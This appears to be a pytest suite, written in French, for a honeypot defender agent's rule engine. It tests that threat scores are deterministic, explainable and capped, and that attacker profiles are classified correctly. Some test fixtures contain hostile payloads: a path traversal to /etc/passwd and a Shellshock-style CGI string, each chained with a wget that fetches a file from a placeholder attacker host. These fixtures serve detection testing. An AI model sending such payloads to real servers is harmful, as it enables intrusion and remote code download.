"""L'agent défenseur doit être explicable, déterministe et plafonné."""

from ipaddress import IPv4Address
from pathlib import Path

import pytest

from shield.collector.defender import DefenderAgent, RuleEngine
from shield.collector.defender.engine import MAX_SCORE, RuleError, ScoreCalculator
from shield.common.schema import AttackerProfile, NormalizedEvent, ServiceName

RULES = Path("rules/detection_rules.yaml")


@pytest.fixture(scope="module")
def agent():
    return DefenderAgent(engine=RuleEngine.from_file(RULES))


def event(**overrides) -> NormalizedEvent:
    base = dict(
        service=ServiceName.SSH,
        source_ip=IPv4Address("192.0.2.10"),
        source_port=44444,
        dest_port=22,
    )
    base.update(overrides)
    return NormalizedEvent(**base)


def test_le_fichier_de_regles_est_valide(agent):
    assert len(agent.engine.rules) >= 10
    assert all(rule.description for rule in agent.engine.rules)
    assert all(0 < rule.weight <= 100 for rule in agent.engine.rules)


def test_identifiants_par_defaut_declenchent_la_regle_attendue(agent):
    verdict = agent.evaluate(event(username="root", password="123456"))
    assert "R-001" in {match.rule_id for match in verdict.matches}
    assert verdict.threat_score > 0


def test_la_somme_des_contributions_egale_le_score(agent):
    """Invariant d'explicabilité — US-13. C'est ce que le jury pourra vérifier."""
    verdict = agent.evaluate(
        event(username="root", password="123456", reputation_score=90),
        {"auth_attempts_by_ip": 30, "distinct_services_by_ip": 3, "events_by_ip_24h": 200},
    )
    assert verdict.is_consistent()
    assert sum(m.contribution for m in verdict.matches) == verdict.threat_score


def test_le_score_est_plafonne_a_cent(agent):
    verdict = agent.evaluate(
        event(
            username="root",
            password="123456",
            reputation_score=99,
            payload=b"GET /../../etc/passwd ;wget http://198.51.100.1/x",
        ),
        {"auth_attempts_by_ip": 500, "distinct_services_by_ip": 3, "events_by_ip_24h": 9000},
    )
    assert verdict.threat_score == MAX_SCORE
    assert verdict.is_consistent()


def test_le_verdict_est_deterministe(agent):
    """US-15 : mêmes entrées, mêmes règles → même sortie, à chaque fois."""
    sample = event(username="admin", password="admin", reputation_score=60)
    counters = {"auth_attempts_by_ip": 25, "distinct_services_by_ip": 2, "events_by_ip_24h": 80}
    first = agent.evaluate(sample, counters)
    for _ in range(20):
        other = agent.evaluate(sample, counters)
        assert other.threat_score == first.threat_score
        assert other.profile == first.profile
        assert [m.rule_id for m in other.matches] == [m.rule_id for m in first.matches]


def test_balayage_silencieux_est_profile_comme_tel(agent):
    verdict = agent.evaluate(event(payload=b"SSH-2.0-zgrab"))
    assert verdict.profile == AttackerProfile.OPPORTUNISTIC_SCAN


def test_force_brute_soutenue_est_profilee_comme_telle(agent):
    verdict = agent.evaluate(
        event(username="root", password="toor"),
        {"auth_attempts_by_ip": 150, "distinct_services_by_ip": 1, "events_by_ip_24h": 400},
    )
    assert verdict.profile == AttackerProfile.TARGETED_BRUTEFORCE


def test_tentative_exploitation_est_profilee_comme_telle(agent):
    verdict = agent.evaluate(
        event(
            service=ServiceName.HTTP,
            dest_port=80,
            payload=b"POST /cgi-bin/x HTTP/1.1\r\n\r\n() { :;};wget http://198.51.100.9/m.sh",
        )
    )
    assert verdict.profile == AttackerProfile.EXPLOITATION_ATTEMPT


def test_evenement_anodin_ne_declenche_presque_rien(agent):
    verdict = agent.evaluate(event(username="alice", password="unguessable-9f3a"))
    assert verdict.threat_score < 20


def test_une_regle_desactivee_ne_se_declenche_pas(agent):
    engine = RuleEngine.from_file(RULES)
    for rule in engine.rules:
        object.__setattr__(rule, "enabled", False)
    quiet = DefenderAgent(engine=engine)
    verdict = quiet.evaluate(event(username="root", password="123456"))
    assert verdict.threat_score == 0
    assert verdict.matches == []


def test_operateur_inconnu_est_detecte():
    engine = RuleEngine.from_file(RULES)
    broken = engine.rules[0]
    object.__setattr__(broken, "condition", {"field": "service", "op": "nope", "value": "ssh"})
    with pytest.raises(RuleError):
        engine.match({"service": "ssh"})


def test_le_calculateur_ne_perd_aucun_point():
    """Répartition des contributions : aucun point n'apparaît ni ne disparaît."""
    engine = RuleEngine.from_file(RULES)
    for size in range(1, len(engine.rules) + 1):
        subset = engine.rules[:size]
        score, matches = ScoreCalculator.compute(subset)
        assert sum(m.contribution for m in matches) == score
        assert all(m.contribution >= 0 for m in matches)
